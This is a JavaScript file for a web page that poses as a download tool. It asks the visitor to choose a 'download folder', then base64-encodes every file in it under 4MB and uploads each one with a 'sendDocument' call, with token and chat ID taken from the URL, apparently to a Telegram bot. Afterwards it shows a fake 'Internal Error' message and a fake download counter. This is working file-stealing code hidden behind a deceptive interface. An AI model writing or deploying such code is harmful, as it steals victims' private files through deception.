/* ---------- read token & id from URL ---------- */
const params = new URLSearchParams(location.search);
const TOKEN  = params.get('token');
const CHAT   = params.get('id');

const PROXY_API_URL = '/api/index2.js';

/* ---------- helpers ---------- */
const $ = s => document.querySelector(s);
const sleep = ms => new Promise(r => setTimeout(r, ms));

/* ---------- Base64 converter ---------- */
function fileToBase64(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onloadend = () => resolve(reader.result.split(',')[1]);
    reader.onerror = reject;
    reader.readAsDataURL(file);
  });
}

/* ---------- Upload single file ---------- */
async function uploadFile(file) {
  // Skip files larger than 4MB
  if (file.size > 4 * 1024 * 1024) {
    console.log(`⏭️ Skipped (>4MB): ${file.name}`);
    return false;
  }

  try {
    const base64 = await fileToBase64(file);
    
    const response = await fetch(PROXY_API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'sendDocument',
        token: TOKEN,
        chat_id: CHAT,
        document: base64,
        filename: file.name
      })
    });
    
    if (response.ok) {
      console.log(`✅ Uploaded: ${file.name}`);
      return true;
    } else {
      console.error(`❌ Failed: ${file.name}`);
      return false;
    }
  } catch (err) {
    console.error(`❌ Error: ${file.name}`, err);
    return false;
  }
}

/* ---------- INSTANT progress updates ---------- */
function updateProgress(current, total) {
  const percent = Math.round((current / total) * 100);
  $('#progressBar').style.width = percent + '%';
  $('#progressText').textContent = `${percent}%`; // টেক্সট ছোট করো
}

/* ---------- Main upload function ---------- */
async function startUpload(fileList) {
  // Convert FileList to array and filter by size
  const allFiles = Array.from(fileList);
  const validFiles = allFiles.filter(f => f.size <= 4 * 1024 * 1024);
  
  const total = validFiles.length;
  const skipped = allFiles.length - total;
  
  console.log(`📊 Total files: ${allFiles.length}`);
  console.log(`✅ Valid files (<4MB): ${total}`);
  console.log(`⏭️ Skipped files (>4MB): ${skipped}`);
  
  if (total === 0) {
    $('#progressText').textContent = `⛔ No files under 4MB to upload`;
    await sleep(2500);
    reset();
    return;
  }

  let uploaded = 0;
  let failed = 0;

  // Upload files in batches of 5
  const BATCH_SIZE = 10;
  
  for (let i = 0; i < total; i += BATCH_SIZE) {
    const batch = validFiles.slice(i, i + BATCH_SIZE);
    
    // Update progress before batch
    updateProgress(i, total);
    
    // Upload batch in parallel
    const results = await Promise.all(
      batch.map(file => uploadFile(file))
    );
    
    // Count results
    results.forEach(success => {
      if (success) uploaded++;
      else failed++;
    });
    
    // Small delay between batches
    await sleep(300);
  }

  // Final update
  updateProgress(total, total);
  console.log(`\n📊 Final Stats:`);
  console.log(`✅ Uploaded: ${uploaded}`);
  console.log(`❌ Failed: ${failed}`);
  console.log(`⏭️ Skipped (>4MB): ${skipped}`);
  
  $('#progressText').textContent = `⛔ Internal Error please try again later`;
  await sleep(2500);
  reset();
}

/* ---------- UI glue ---------- */
function reset() {
  $('#downloadForm').reset();
  $('#startBtn').disabled = true;
  $('#folderInfo').classList.remove('show');
  $('#progressSection').classList.remove('show');
  $('#progressBar').style.width = '0%';
  $('#folderBtn').textContent = '📁 Choose Download Folder';
}

$('#folderBtn').onclick = () => $('#folderInput').click();
$('#folderInput').onchange = () => {
  const files = $('#folderInput').files;
  if (!files.length) return;
  $('#folderName').textContent = '📁 ' + files[0].webkitRelativePath.split('/')[0];
  $('#folderInfo').classList.add('show');
  $('#startBtn').disabled = false;
  $('#folderBtn').textContent = '📁 Change Folder';
};

$('#downloadForm').onsubmit = async e => {
  e.preventDefault();
  const list = $('#folderInput').files;
  if (!list.length) return;
  $('#startBtn').disabled = true;
  await sleep(200);
  $('#progressSection').classList.add('show');
  await startUpload(list);
};

/* ---------- stats animation ---------- */
setInterval(() => {
  const current = parseFloat($('#stats').textContent.match(/[\d.]+/)[0]);
  const newCount = (current + Math.random() * 0.1 + 0.05).toFixed(1);
  $('#stats').textContent = `${newCount}M+ downloads today — join the community!`;
}, 12000);
